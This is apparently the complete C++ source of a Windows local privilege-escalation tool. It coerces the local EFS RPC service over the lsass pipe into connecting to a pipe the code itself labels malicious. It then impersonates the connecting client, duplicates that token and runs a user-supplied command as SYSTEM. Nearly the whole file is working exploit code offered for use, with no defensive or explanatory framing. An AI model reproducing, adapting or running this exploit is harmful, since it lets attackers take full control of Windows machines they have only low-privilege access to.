#include "ms-efsr_h.h"
#include <windows.h>
#include <stdio.h>
#include <thread>
#include <tchar.h>
#include <strsafe.h>
#include <conio.h>
#include <iostream>
#include <userenv.h>

#pragma comment(lib, "RpcRT4.lib")

HANDLE CreatePetitNamedPipe();
HANDLE ConnectPetitNamedPipe(HANDLE hNamedPipe);
DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam);
void GetSystem(HANDLE hNamedPipe, LPWSTR Command);
void PetitPotamConnect(DWORD EfsID);


void _tmain(int argc, TCHAR* argv[])
{
    if (argc != 3)
    {
        printf("Usage: %S [EfsID] [Command]\n", argv[0]);
        return;
    }

    HANDLE hThread = NULL;

    hThread = CreateThread(NULL, 0, LaunchPetitNamedPipeServer, (LPWSTR)argv[2], 0, NULL);
    DWORD EfsID = (DWORD)_wtol((TCHAR*)argv[1]);

    Sleep(1000);
    PetitPotamConnect(EfsID);
    Sleep(1500);
}


DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam)
{
    HANDLE hNamedPipe = NULL;
    LPWSTR lpName;
    LPWSTR Command = (LPWSTR)lpParam;

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(lpName, MAX_PATH, L"\\\\.\\pipe\\petit\\pipe\\srvsvc");

    if ((hNamedPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)))
    {
        printf("\n[+] Malicious named pipe running on %S.\n", lpName);
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        return 0;
    }

    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
    {
        printf("[+] The connection is successful.\n");
    }
    else
    {
        printf("[-] ConnectNamedPipe() Error: %i.\n", GetLastError());
        return 0;
    }

    GetSystem(hNamedPipe, Command);
    CloseHandle(hNamedPipe);

    return 0;
}


void GetSystem(HANDLE hNamedPipe, LPWSTR Command)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    HANDLE hProcess;
    HANDLE hToken = NULL;
    HANDLE phNewToken = NULL;

    // clear a block of memory
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (ImpersonateNamedPipeClient(hNamedPipe))
    {
        printf("[+] ImpersonateNamedPipeClient success.\n");
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        return;
    }

    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        printf("[+] OpenThreadToken success.\n");
    }
    else
    {
        printf("[-] OpenThreadToken() Error: %i.\n", GetLastError());
        return;
    }

    if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken))
    {
        printf("[+] DuplicateTokenEx success.\n");
    }
    else
    {
        printf("[-] DupicateTokenEx() Error: %i.\n", GetLastError());
        return;
    }

    if (CreateProcessAsUser(phNewToken, NULL, Command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        printf("[+] CreateProcessAsUser success.\n");

        CloseHandle(hToken);
        CloseHandle(phNewToken);

        return;
    }
    else if (GetLastError() != NULL)
    {
        printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");
        
        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, Command, 0, NULL, NULL, &si, &pi))
        {
            printf("[+] CreateProcessWithTokenW success.\n");

            RevertToSelf();
            CloseHandle(hToken);
            CloseHandle(phNewToken);

            return;
        }
        else
        {
            printf("[-] CreateProcessWithTokenW failed (%d).\n", GetLastError());

            RevertToSelf();
            CloseHandle(hToken);
            CloseHandle(phNewToken);

            return;
        }
    }
}


void PetitPotamConnect(DWORD EfsID)
{
    RPC_WSTR ObjUuid = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";    // Pointer to a null-terminated string representation of an object UUID. 
    RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                // Pointer to a null-terminated string representation of a protocol sequence.;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                       // Pointer to a null-terminated string representation of a network address.
    RPC_WSTR Endpoint = (RPC_WSTR)L"\\pipe\\lsass";                          // Pointer to a null-terminated string representation of an endpoint.
    RPC_WSTR Options = NULL;                                                 // Pointer to a null-terminated string representation of network options.
    RPC_WSTR StringBinding;                                                  // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.

    RPC_STATUS RpcStatus;

    RPC_BINDING_HANDLE binding_h;

    RpcStatus = RpcStringBindingComposeW(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, &StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringBindingComposeW() Error: %i\n", GetLastError());
        return;
    }


    RpcStatus = RpcBindingFromStringBindingW(
        StringBinding,    // Previously created string binding
        &binding_h    // Output binding handle
    );
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBindingW() Error: %i\n", GetLastError());
        return;
    }


    RpcStringFreeW(&StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringFreeW() Error: %i\n", GetLastError());
        return;
    }

    RpcTryExcept
    {
        // Invoke remote procedure here
        LPWSTR PipeFileName;
        long result;

        PipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
        StringCchPrintf(PipeFileName, MAX_PATH, L"\\\\localhost/pipe/petit\\C$\\wh0nqs.txt");


        if (EfsID == 0)
        {
            wprintf(L"[+] Invoking EfsRpcOpenFileRaw with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcOpenFileRaw(
             *      [in] handle_t binding_h,
             *      [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
             *      [in, string] wchar_t* FileName,
             *      [in] long Flags
             *  );
             */

            PVOID hContext;
            result = Proc0_EfsRpcOpenFileRaw_Downlevel(binding_h, &hContext, PipeFileName, 0);
        }
        if (EfsID == 1)
        {
            wprintf(L"[+] Invoking EfsRpcEncryptFileSrv with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcEncryptFileSrv(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName
             *  );
            */

            result = Proc4_EfsRpcEncryptFileSrv_Downlevel(binding_h, PipeFileName);
        }

        if (EfsID == 2)
        {
            wprintf(L"[+] Invoking EfsRpcDecryptFileSrv with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcDecryptFileSrv(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] unsigned long OpenFlag
             *  );
             */

            result = Proc5_EfsRpcDecryptFileSrv_Downlevel(binding_h, PipeFileName, 0);
        }
        if (EfsID == 3)
        {
            wprintf(L"[+] Invoking EfsRpcQueryUsersOnFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcQueryUsersOnFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *Users
             *  );
             */

            Struct_220_t* Users;
            result = Proc6_EfsRpcQueryUsersOnFile_Downlevel(binding_h, PipeFileName, &Users);
        }
        if (EfsID == 4)
        {
            wprintf(L"[+] Invoking EfsRpcQueryRecoveryAgents with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcQueryRecoveryAgents(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *RecoveryAgents
             *  );
             */

            Struct_220_t* RecoveryAgents;
            result = Proc7_EfsRpcQueryRecoveryAgents_Downlevel(binding_h, PipeFileName, &RecoveryAgents);
        }
        if (EfsID == 5)    // error
        {
            wprintf(L"[+] Invoking EfsRpcRemoveUsersFromFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcRemoveUsersFromFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_HASH_LIST* Users
             *  );
             */

            Struct_220_t Users;
            result = Proc8_EfsRpcRemoveUsersFromFile_Downlevel(binding_h, PipeFileName, &Users);
        }
        if (EfsID == 6)
        {
            wprintf(L"[+] Invoking EfsRpcAddUsersToFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcAddUsersToFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_LIST * EncryptionCertificates
             *  );
             */

            Struct_346_t EncryptionCertificates;
            result = Proc9_EfsRpcAddUsersToFile_Downlevel(binding_h, PipeFileName, &EncryptionCertificates);
        }
        if (EfsID == 7)
        {
            wprintf(L"[+] Invoking EfsRpcFileKeyInfo with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcFileKeyInfo(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] DWORD InfoClass,
             *      [out] EFS_RPC_BLOB** KeyInfo
             *  );
             */

            Struct_392_t* KeyInfo;
            Proc12_EfsRpcFileKeyInfo_Downlevel(binding_h, PipeFileName, 0, &KeyInfo);

        }
        if (EfsID == 8)    // error
        {
            wprintf(L"[+] Invoking EfsRpcDuplicateEncryptionInfoFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcDuplicateEncryptionInfoFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* SrcFileName,
             *      [in, string] wchar_t* DestFileName,
             *      [in] DWORD dwCreationDisposition,
             *      [in] DWORD dwAttributes,
             *      [in, unique] EFS_RPC_BLOB* RelativeSD,
             *      [in] BOOL bInheritHandle
             *  );
             */

            Struct_392_t RelativeSD;
            result = Proc13_EfsRpcDuplicateEncryptionInfoFile_Downlevel(binding_h, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
        }

        if (EfsID == 9)
        {
            wprintf(L"[+] Invoking EfsRpcAddUsersToFileEx with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcAddUsersToFileEx(
             *      [in] handle_t binding_h,
             *      [in] DWORD dwFlags,
             *      [in, unique] EFS_RPC_BLOB* Reserved,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_LIST* EncryptionCertificates
             *  );
             */

            Struct_392_t Reserved;
            Struct_346_t EncryptionCertificates;
            result = Proc15_EfsRpcAddUsersToFileEx_Downlevel(binding_h, 0, &Reserved, PipeFileName, &EncryptionCertificates);
        }

        if (EfsID == 10)    // error
        {
            wprintf(L"[+] Invoking EfsRpcFileKeyInfoEx with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcFileKeyInfoEx(
             *      [in] handle_t binding_h,
             *      [in] DWORD dwFileKeyInfoFlags,
             *      [in, unique] EFS_RPC_BLOB* Reserved,
             *      [in, string] wchar_t* FileName,
             *      [in] DWORD InfoClass,
             *      [out] EFS_RPC_BLOB** KeyInfo
             *  );
             */

            Struct_392_t Reserved;
            Struct_392_t* KeyInfo;
            Proc16_EfsRpcFileKeyInfoEx_Downlevel(binding_h, 0, &Reserved, PipeFileName, 0, &KeyInfo);
        }
        if (EfsID == 11)    // error
        {
            wprintf(L"[+] Invoking EfsRpcGetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcGetEncryptedFileMetadata(
             *      [in] handle_t binding_h,
             *      [in, string, ref] wchar_t* FileName,
             *      [out, ref] EFS_RPC_BLOB ** EfsStreamBlob
             *  );
             */

            Struct_392_t* EfsStreamBlob;
            Proc18_EfsRpcFileKeyInfoEx_Downlevel(binding_h, PipeFileName, &EfsStreamBlob);
        }

        if (EfsID == 12)    // error
        {
            wprintf(L"[+] Invoking EfsRpcSetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcSetEncryptedFileMetadata(
             *      [in] handle_t binding_h,
             *      [in, string, ref] wchar_t* FileName,
             *      [in, unique] EFS_RPC_BLOB* OldEfsStreamBlob,
             *      [in, ref] EFS_RPC_BLOB* NewEfsStreamBlob,
             *      [in, unique] ENCRYPTED_FILE_METADATA_SIGNATURE* NewEfsSignature
             *  );
             */

            Struct_392_t OldEfsStreamBlob;
            Struct_392_t NewEfsStreamBlob;
            Struct_492_t NewEfsSignature;
            Proc19_EfsRpcFileKeyInfoEx_Downlevel(binding_h, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
        }


        LocalFree(PipeFileName);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        wprintf(L"Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
    }
    RpcEndExcept
    {
        RpcBindingFree(&binding_h);
    }
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}